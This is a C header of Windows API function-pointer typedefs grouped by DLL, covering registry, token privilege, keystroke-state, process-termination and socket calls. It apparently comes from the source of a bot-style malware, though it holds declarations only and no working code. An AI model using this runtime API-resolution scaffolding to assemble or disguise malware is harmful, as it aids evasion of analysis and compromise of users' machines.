// advapi32.dll
typedef BOOL (__stdcall *GUN)(LPTSTR, LPDWORD);
typedef LONG (__stdcall *RCKE)(HKEY,LPCTSTR,DWORD,LPTSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
typedef LONG (__stdcall *RSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE *,DWORD);
typedef LONG (__stdcall *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM,PHKEY);
typedef LONG (__stdcall *RQVE)(HKEY,LPCTSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD);
typedef LONG (__stdcall *RCK)(HKEY);
typedef LONG (__stdcall *RDK)(HKEY,LPCTSTR);
typedef BOOL (__stdcall *ATP)(HANDLE,BOOL,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
typedef BOOL (__stdcall *LPV)(LPCTSTR,LPCTSTR,PLUID);
typedef BOOL (__stdcall *OPT)(HANDLE,DWORD,PHANDLE);

// shell32.dll
typedef HINSTANCE (__stdcall *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);
typedef HRESULT (__stdcall *SHGFP)(HWND,int,HANDLE,DWORD,LPTSTR);

// ole32.dll
typedef HRESULT (__stdcall *CCI)(REFCLSID,LPUNKNOWN,DWORD,REFIID,LPVOID);
typedef void (__stdcall *CU)(void);
typedef HRESULT (__stdcall *CIE)(void *,DWORD);

// oleaut32.dll
typedef void (__stdcall *SFS)(BSTR);
typedef BSTR (__stdcall *SAS)(const OLECHAR *);
typedef UINT (__stdcall *SSL)(BSTR);

// user32.dll
typedef int (__stdcall *MB)(HWND,LPCTSTR,LPCTSTR,UINT);
typedef DWORD (__stdcall *GWTPI)(HWND,LPDWORD);
typedef LRESULT (__stdcall *SM)(HWND,UINT,WPARAM,LPARAM);
typedef int (__stdcall *GCN)(HWND,LPTSTR,int);
typedef int (__stdcall *GWT)(HWND,LPTSTR,int);
typedef BOOL (__stdcall *ECW)(HWND,WNDENUMPROC,LPARAM);
typedef HWND (__stdcall *FW)(LPCTSTR,LPCTSTR);
typedef BOOL (__stdcall *EWE)(UINT,DWORD);
typedef SHORT (__stdcall *GAKS)(int);
typedef SHORT (__stdcall *GKS)(int);


// ws2_32.dll
typedef int (__stdcall *WSAS)(WORD,LPWSADATA);
typedef int (__stdcall *WSAC)(void);
typedef SOCKET (__stdcall *SOCK)(int,int,int);
typedef int (__stdcall *CON)(SOCKET,const struct sockaddr *,int);
typedef unsigned long (__stdcall *IADDR)(const char *);
typedef u_short (__stdcall *HTONS)(u_short);
typedef int (__stdcall *SEND)(SOCKET,const char *,int,int);
typedef int (__stdcall *RECV)(SOCKET,char *,int,int);
typedef int (__stdcall *SEL)(int,fd_set *,fd_set *,fd_set *,const struct timeval *);
typedef int (__stdcall *SSO)(SOCKET,int,int,const char *,int);
typedef int (__stdcall *GSN)(SOCKET,struct sockaddr *,int *);
typedef struct hostent* FAR (__stdcall *GHBN)(const char *);
typedef struct hostent* FAR (__stdcall *GHBA)(const char *,int,int);
typedef int (__stdcall *CLSO)(SOCKET);
#ifndef NO_PROXY
typedef int (__stdcall *WSAFDIS)(SOCKET,fd_set *);
typedef int (__stdcall *WSAI)(SOCKET,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPWSAOVERLAPPED,LPWSAOVERLAPPED_COMPLETION_ROUTINE);
typedef int (__stdcall *GPN)(SOCKET,struct sockaddr*,int*);
typedef u_short (__stdcall *NTOHS)(u_short);
typedef u_long (__stdcall *NTOHL)(u_long);
typedef int (__stdcall *RECVFROM)(SOCKET,char *,int,int,struct sockaddr *,int *);
typedef int (__stdcall *BIND)(SOCKET,const struct sockaddr *,int);
typedef int (__stdcall *SENDTO)(SOCKET,const char *,int,int,const struct sockaddr *,int);
typedef int (__stdcall *LIS)(SOCKET,int);
typedef SOCKET (__stdcall *ACC)(SOCKET,struct sockaddr *,int *);
typedef char * FAR (__stdcall *INTOA)(struct in_addr);
#endif

// kernel32.dll

typedef int (__stdcall *MBTWC)(UINT,DWORD,LPCSTR,int,LPWSTR,int);
typedef BOOL (__stdcall *CH)(HANDLE);
typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *TP)(HANDLE,UINT);
typedef HANDLE (__stdcall *OP)(DWORD,BOOL,DWORD);
typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
typedef UINT (__stdcall *GSD)(LPTSTR,UINT);
typedef BOOL (__stdcall *CP)(LPCTSTR,LPTSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCTSTR,LPSTARTUPINFO,LPPROCESS_INFORMATION);
typedef DWORD (__stdcall *GMFN)(HMODULE,LPTSTR,DWORD);
typedef BOOL (__stdcall *FC)(HANDLE);
typedef BOOL (__stdcall *FNF)(HANDLE,LPWIN32_FIND_DATA);
typedef DWORD (__stdcall *GLE)(void);
typedef HANDLE (__stdcall *FFF)(LPCTSTR,LPWIN32_FIND_DATA);
typedef DWORD (__stdcall *GLDS)(DWORD,LPTSTR);
typedef BOOL (__stdcall *DF)(LPCTSTR);
typedef BOOL (__stdcall *CD)(LPCTSTR,LPSECURITY_ATTRIBUTES);
typedef BOOL (__stdcall *RD)(LPCTSTR);
typedef BOOL (__stdcall *GVE)(LPOSVERSIONINFO);
typedef BOOL (__stdcall *SFA)(LPCTSTR,DWORD);
typedef BOOL (__stdcall *CPIPE)(PHANDLE,PHANDLE,LPSECURITY_ATTRIBUTES,DWORD);
typedef BOOL (__stdcall *PNP)(HANDLE,LPVOID,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef BOOL (__stdcall *GECP)(HANDLE,LPDWORD);
typedef VOID (__stdcall *GSI)(LPSTARTUPINFO);
typedef HANDLE (__stdcall *CT)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef BOOL (__stdcall *TT)(HANDLE,DWORD);









